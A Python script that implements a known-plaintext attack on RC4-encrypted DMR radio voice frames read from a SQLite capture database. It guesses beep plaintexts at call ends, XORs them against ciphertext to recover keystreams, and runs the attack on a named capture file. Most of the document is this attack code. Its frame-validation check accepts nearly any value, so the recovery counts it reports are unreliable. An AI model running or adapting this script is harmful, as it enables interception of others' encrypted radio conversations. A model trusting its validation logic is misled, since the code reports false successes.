#!/usr/bin/env python3

import sqlite3
import pandas as pd
from collections import defaultdict
import numpy as np

def implement_dmr_rc4_attack(db_path):
    """Implement the actual DMR RC4 attack methodology"""
    print("=== DMR RC4 ATTACK IMPLEMENTATION ===")
    print("\nKey insight: Encrypted frames NEVER repeat because RC4 keystream changes!")
    print("Attack relies on fixed H-MI making keystream predictable\n")
    
    conn = sqlite3.connect(db_path)
    
    # Get all frames with full context
    all_frames = []
    frames_by_cmi = defaultdict(list)
    
    c_tables = pd.read_sql_query("""
        SELECT name FROM sqlite_master 
        WHERE type='table' AND name LIKE 'C_%'
    """, conn)
    
    for table_name in c_tables['name']:
        c_mi = int(table_name.split('_')[1], 16)
        
        frames = pd.read_sql_query(f"""
            SELECT ambe_hex, timestamp, mi_full
            FROM '{table_name}'
            ORDER BY timestamp
        """, conn)
        
        for idx, row in frames.iterrows():
            frame_data = {
                'ambe_hex': row['ambe_hex'],
                'c_mi': c_mi,
                'timestamp': pd.to_datetime(row['timestamp']),
                'position': idx,
                'mi_full': row['mi_full']
            }
            all_frames.append(frame_data)
            frames_by_cmi[c_mi].append(frame_data)
    
    print(f"Collected {len(all_frames)} encrypted AMBE frames")
    print(f"Unique C-MI values: {len(frames_by_cmi)}")
    
    # Step 1: Identify potential beep locations
    print("\n=== STEP 1: IDENTIFY POTENTIAL BEEP LOCATIONS ===")
    
    # Look at last frames before gaps (call ends)
    all_frames.sort(key=lambda x: x['timestamp'])
    
    potential_beeps = []
    for i in range(1, len(all_frames)):
        time_diff = (all_frames[i]['timestamp'] - 
                    all_frames[i-1]['timestamp']).total_seconds()
        
        if time_diff > 0.5:  # Transmission gap
            # Last few frames before gap are candidates
            for j in range(max(0, i-5), i):
                potential_beeps.append(all_frames[j])
    
    print(f"Found {len(potential_beeps)} potential beep frames")
    
    # Step 2: Known plaintext candidates
    print("\n=== STEP 2: KNOWN PLAINTEXT CANDIDATES ===")
    
    # Common AMBE beep patterns (from DMR spec or unencrypted captures)
    known_beep_patterns = [
        "0200000000000000",  # Simple beep
        "02FFFFFFFFFFFFFF",  # Inverted beep
        "025ADC4000B12800",  # Observed pattern
        "02BC360000BAEC00",  # Observed pattern
    ]
    
    print(f"Testing {len(known_beep_patterns)} known beep patterns")
    
    # Step 3: Keystream recovery attempt
    print("\n=== STEP 3: KEYSTREAM RECOVERY ===")
    
    recovered_keystreams = defaultdict(list)
    
    for beep_candidate in potential_beeps[:5]:  # Test first 5
        encrypted = int(beep_candidate['ambe_hex'], 16)
        c_mi = beep_candidate['c_mi']
        
        print(f"\nTesting encrypted frame: {beep_candidate['ambe_hex']}")
        print(f"C-MI: 0x{c_mi:08X}")
        
        for plaintext_pattern in known_beep_patterns:
            plaintext = int(plaintext_pattern, 16)
            
            # XOR to get potential keystream
            keystream = encrypted ^ plaintext
            
            print(f"  Plaintext: {plaintext_pattern}")
            print(f"  Keystream: {keystream:016X}")
            
            # Test keystream on other frames with same C-MI
            valid_count = test_keystream(frames_by_cmi[c_mi], keystream)
            
            if valid_count > 0:
                recovered_keystreams[c_mi].append({
                    'keystream': keystream,
                    'plaintext': plaintext_pattern,
                    'valid_count': valid_count
                })
                print(f"  Valid frames: {valid_count}")
    
    # Step 4: Validate with AMBE decoder
    print("\n=== STEP 4: VALIDATION ===")
    
    if recovered_keystreams:
        print("\nRecovered keystreams:")
        for c_mi, keystreams in recovered_keystreams.items():
            print(f"\nC-MI 0x{c_mi:08X}:")
            for ks_data in keystreams:
                print(f"  Keystream: {ks_data['keystream']:016X}")
                print(f"  Valid frames: {ks_data['valid_count']}")
    else:
        print("\nNo keystreams recovered - need more data or different plaintext patterns")
    
    conn.close()
    
    return recovered_keystreams

def test_keystream(frames, keystream):
    """Test if keystream produces valid AMBE frames"""
    valid_count = 0
    
    for frame_data in frames[:10]:  # Test first 10 frames
        encrypted = int(frame_data['ambe_hex'], 16)
        
        # Decrypt with keystream
        decrypted = encrypted ^ keystream
        
        # Basic AMBE validation
        if is_valid_ambe(decrypted):
            valid_count += 1
    
    return valid_count

def is_valid_ambe(frame_int):
    """Basic AMBE frame validation"""
    # Check bit distribution
    bit_count = bin(frame_int).count('1')
    
    # AMBE frames typically have balanced bits
    if 10 <= bit_count <= 54:
        # Additional checks could go here
        return True
    
    return False

def demonstrate_attack_theory():
    """Explain the attack theory clearly"""
    print("\n=== ATTACK THEORY EXPLANATION ===")
    print("""
    Why encrypted frames never repeat:
    
    1. RC4 generates a unique keystream for each frame
    2. Keystream = RC4(Key, IV)
    3. IV = H-MI || C-MI (concatenation)
    4. Even with same plaintext, different C-MI = different ciphertext
    
    The attack exploits:
    
    1. Fixed H-MI (0x6C8AB637) makes IV predictable
    2. C-MI follows LFSR pattern (we can predict it)
    3. Known plaintext (beeps) at predictable locations
    4. Same C-MI = same keystream (if H-MI is fixed)
    
    Attack process:
    
    1. Find encrypted frames at call ends (likely beeps)
    2. Guess plaintext beep pattern
    3. XOR to recover keystream: KS = CT ⊕ PT
    4. Test keystream on other frames with same C-MI
    5. Valid AMBE after decryption = correct keystream
    6. With enough keystreams, can predict future frames
    """)

# Run the attack
db_path = "/home/ubuntu/dsd-fme_sqlite/build/dmr_capture_20250517_025824.db"
demonstrate_attack_theory()
recovered_keystreams = implement_dmr_rc4_attack(db_path)